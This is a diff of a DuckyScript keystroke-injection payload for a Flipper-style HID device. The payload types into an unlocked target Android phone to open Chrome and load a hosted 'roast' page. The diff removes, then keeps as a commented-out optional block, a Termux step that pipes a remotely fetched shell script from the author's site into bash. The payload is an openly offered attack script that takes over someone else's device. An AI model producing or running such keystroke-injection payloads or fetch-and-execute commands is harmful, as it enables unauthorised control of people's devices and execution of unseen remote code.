@@ -1,51 +1,57 @@
 REM GhostSnitch Android Payload
 REM Author: TBJr
-REM Description: Executes Android prank script - works without Termux!
-REM Version: 3.1 - Fixed Chrome opening method (UI navigation instead of shell commands)
-REM 
-REM This payload works on ANY Android device with Chrome (pre-installed on most)
-REM No Termux or special apps required!
-REM 
-REM IMPORTANT: This script uses UI navigation to open Chrome (not shell commands)
-REM Device must be unlocked and on home screen for best results
+REM Version: 3.2
+REM Description: Opens Chrome and navigates to the hosted GhostSnitch page
+REM
+REM REQUIREMENTS:
+REM   - Device must be unlocked and on the home screen
+REM   - Chrome must be installed (pre-installed on most Android devices)
+REM   - The hosted page uses a tap-to-start button, so the target still needs
+REM     one tap after the page loads — the TTS roast begins on that tap
+REM
+REM LIMITATIONS:
+REM   - Home-screen search behaviour varies by launcher (Pixel, Samsung, MIUI, etc.)
+REM   - Increase DELAY values on slower or older devices
+REM   - Android home button is a physical key and cannot be reliably sent via HID;
+REM     GUI (Meta/Windows key) is the closest HID equivalent and works on many devices
 
-REM Method 1: Web-based execution (Primary - works on all Android devices)
-REM Opens Chrome and executes script using Web APIs (Web Speech API for TTS)
-REM IMPORTANT: Device must be unlocked and on home screen for this to work
-REM 
-REM Step 1: Go to home screen (press home button)
+REM ── Step 1: Press home to ensure we start from the home screen ──────────────
 GUI
-DELAY 1000
-REM Step 2: Open Chrome via app launcher
-REM Try multiple methods to ensure Chrome opens:
-REM Method A: If device has a search bar on home screen, type there
-REM Method B: Open app drawer (varies by device - some use swipe up)
-REM We'll start typing "chrome" which should work in most launchers
-STRING chrome
-DELAY 1500
-REM Step 3: Select Chrome from search results
-ENTER
-DELAY 3000
-REM Step 4: Chrome should now be open - navigate to URL
-REM Chrome address bar auto-focuses when you start typing a URL
-REM If address bar isn't focused, try pressing Ctrl+L or F6 (may not work on all devices)
-STRING https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html
-DELAY 1000
-ENTER
-DELAY 3000
-
-REM Method 2: Fallback - Try Termux if available (for enhanced features)
-REM NOTE: This requires Termux to be installed and accessible via app launcher
-REM Step 1: Go to home screen
-GUI
-DELAY 800
-REM Step 2: Search for Termux app
-STRING termux
 DELAY 1200
+
+REM ── Step 2: Type "chrome" to trigger the launcher search ────────────────────
+REM Most launchers (Pixel, One UI, MIUI) begin filtering installed apps as you type
+STRING chrome
+DELAY 1800
+
+REM ── Step 3: Open Chrome from search results ──────────────────────────────────
 ENTER
-DELAY 2000
-REM Step 3: Once Termux opens, execute the script
-STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh)"
+DELAY 3500
+
+REM ── Step 4: Focus Chrome's address bar before typing the URL ─────────────────
+REM Without CTRL+L the typed URL goes into the page body, not the omnibox
+CTRL l
+DELAY 600
+
+REM ── Step 5: Type the URL and navigate ────────────────────────────────────────
+STRING https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.html
+DELAY 400
 ENTER
-DELAY 500
-ENTER
+
+REM ── Done ─────────────────────────────────────────────────────────────────────
+REM The page loads and displays a "Tap to Continue" button.
+REM The target must tap it once — that tap satisfies Chrome's autoplay policy
+REM so the Web Speech API (TTS roast) actually fires.
+REM
+REM ── Optional: Termux fallback for enhanced features ───────────────────────────
+REM Uncomment the block below ONLY if Termux is installed on the target device.
+REM Running both methods sequentially will open Chrome AND Termux.
+REM
+REM GUI
+REM DELAY 1200
+REM STRING termux
+REM DELAY 1500
+REM ENTER
+REM DELAY 2500
+REM STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/ghostsnitch_android.sh)"
+REM ENTER
